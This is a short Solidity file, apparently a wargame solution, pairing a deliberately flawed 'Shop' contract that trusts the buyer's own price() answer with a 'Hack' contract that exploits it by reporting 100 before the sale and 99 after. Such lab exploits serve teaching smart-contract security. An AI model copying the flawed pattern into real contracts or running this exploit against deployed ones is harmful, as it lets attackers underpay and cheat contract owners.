// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract Hack {
    Shop private immutable shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function pwn() external {
        shop.buy();
        require(shop.price() == 99, "price != 99");
    }

    function price() external view returns (uint) {
        if (shop.isSold()) {
            return 99;
        }
        return 100;
    }
}